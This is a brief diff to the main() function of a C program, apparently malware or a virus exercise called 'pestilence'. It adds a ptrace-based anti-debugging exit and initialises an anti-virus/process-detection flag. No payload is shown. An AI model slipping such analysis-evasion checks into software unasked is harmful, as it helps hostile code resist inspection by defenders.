@@ -54,9 +54,12 @@ int main()
     char            path[1024];
     int             i = 0;
 
+    if (ptrace(PTRACE_TRACEME, 0, 0, 0) == -1)
+        exit (1);
     pestilence = malloc(sizeof(t_pestilence));
     if (!pestilence)
         return (1);
+    pestilence->anti_virus = 0;
     ft_antiprocess(pestilence);
     if (!pestilence->anti_virus)
     {
